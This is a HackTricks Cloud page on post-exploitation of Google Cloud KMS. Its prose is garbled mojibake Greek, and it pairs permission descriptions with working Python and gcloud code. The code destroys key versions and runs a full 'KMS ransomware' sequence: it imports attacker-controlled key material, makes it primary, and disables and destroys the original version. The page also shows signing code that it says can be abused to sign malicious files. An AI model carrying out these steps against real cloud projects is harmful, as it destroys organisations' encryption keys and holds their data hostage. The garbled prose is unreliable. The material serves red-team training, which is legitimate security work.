# GCP - KMS Post Exploitation

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## KMS

Î’ÏÎµÎ¯Ï„Îµ Î²Î±ÏƒÎ¹ÎºÎ­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ KMS ÏƒÏ„Î¿:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î¼Î¹Î± Î­ÎºÎ´Î¿ÏƒÎ· KMS. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Ï€ÏÎ­Ï€ÎµÎ¹ Ï€ÏÏÏ„Î± Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï„Î¿ ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

Î£Ï„Î¿ AWS ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ ÎµÎ½Ï„ÎµÎ»ÏÏ‚ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯ KMS** Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï€ÏŒÏÏ‰Î½ KMS ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î¼ÏŒÎ½Î¿ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï… Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯. Î”ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… ÏŒÏ„Î¹ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ Ï€ÏŒÏÏ‰Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÏƒÏ„Î¿ GCP, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ.

Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î± Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î¿ KMS Ransomware, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Î¸Î± Ï€ÎµÏÎ¹Î»Î¬Î¼Î²Î±Î½Îµ Ï„Î± ÎµÎ¾Î®Ï‚ Î²Î®Î¼Î±Ï„Î±:

* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ Î½Î­Î±Ï‚ **Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î¼Îµ Ï…Î»Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï** Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎµÎ¹ÏƒÎ±Ï‡Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* ÎŸÏÎ¯ÏƒÏ„Îµ Ï„Î¿ Ï‰Ï‚ **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î­ÎºÎ´Î¿ÏƒÎ·** (Î³Î¹Î± Î¼ÎµÎ»Î»Î¿Î½Ï„Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î¸Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸Î¿ÏÎ½)
* **Î•Ï€Î±Î½Î±ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÏ„Îµ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎ± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Ï€Î¿Ï… ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®Î¸Î·ÎºÎ±Î½ Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Î­ÎºÎ´Î¿ÏƒÎ· Î¼Îµ Ï„Î· Î½Î­Î±.
* **Î”Î¹Î±Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ KMS**
* Î¤ÏÏÎ± Î¼ÏŒÎ½Î¿ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚, Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Ï…Î»Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Ï„Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±

#### Î•Î´Ï ÎµÎ¯Î½Î±Î¹ Ï„Î± Î²Î®Î¼Î±Ï„Î± Î³Î¹Î± Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Î¼Î¹Î±Ï‚ Î½Î­Î±Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·/Î´Î¹Î±Î³ÏÎ±Ï†Î® Ï„Ï‰Î½ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÏ‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

Î‘Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½ ÎºÎ»ÎµÎ¹Î´Î¯. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î± Ï€Î¹Î¿ Î´ÏÏƒÎºÎ¿Î»Î± Î½Î± Î±Î½Î±Î»Ï…Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î±Î¼Ï…Î½ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚.

### `cloudkms.cryptoKeyVersions.useToDecrypt` | `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

Î‘Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ Î¼Îµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î±Î¼Ï…Î½ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î´ÎµÎ¹ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎµÎ½ÏŒÏ‚ Î±ÏƒÏÎ¼Î¼ÎµÏ„ÏÎ¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï. Î‘Î½ ÎºÎ±Î¹ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±Ï€ÏŒ Î¼ÏŒÎ½Î¿ Ï„Î¿Ï… ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Î¬Î»Î»ÎµÏ‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚.

### `cloudkms.cryptoKeyVersions.view`

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î´ÎµÎ¹ Ï„Î¹Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ ÎµÎ½ÏŒÏ‚ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÎ¹ ÎºÎ±Î»ÏÏ„ÎµÏÎ± Ï„Î·Î½ Ï…Ï€Î¿Î´Î¿Î¼Î® ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½ Ï„Î¿Ï… ÏƒÏ„ÏŒÏ‡Î¿Ï… ÎºÎ±Î¹ Î½Î± ÏƒÏ‡ÎµÎ´Î¹Î¬ÏƒÎµÎ¹ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚.
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

Î¤Î¿ permission `cloudkms.cryptoKeyVersions.useToSign` ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Ï…Ï€Î¿Î³ÏÎ¬ÏˆÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†Î® ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î® Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½ phishing.

#### Î§ÏÎ®ÏƒÎ· Ï„Î¿Ï… gcloud Î³Î¹Î± Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

```bash
gcloud kms keys versions sign --key <KEY_NAME> --keyring <KEYRING_NAME> --location <LOCATION> --digest-algorithm "sha256" --digest-file <DIGEST_FILE> --output-file <OUTPUT_FILE>
```

#### Î§ÏÎ®ÏƒÎ· Ï„Î¿Ï… API Î³Î¹Î± Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

```python
from google.cloud import kms

client = kms.KeyManagementServiceClient()
name = client.crypto_key_version_path('<PROJECT_ID>', '<LOCATION>', '<KEYRING_NAME>', '<KEY_NAME>', '<VERSION>')
digest = {'sha256': <DIGEST>}
response = client.asymmetric_sign(name=name, digest=digest)
signature = response.signature
```
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

ÎœÎµÏ„Î¬ Ï„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï„Ï‰Î½ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î³Î¹Î± Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎ¿Ï…Î¼Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î±. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±Ï‚ Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†ÎµÎ¯ Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯.

```bash
gcloud kms keys versions verify \
    --key <KEY_NAME> \
    --keyring <KEYRING_NAME> \
    --location <LOCATION> \
    --version <VERSION_NUMBER> \
    --input-file <INPUT_FILE> \
    --signature-file <SIGNATURE_FILE>
```

Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï€ÏÏ‚ Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎµÏ„Îµ Î¼Î¹Î± Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯.
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î”ÎµÎ¯Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
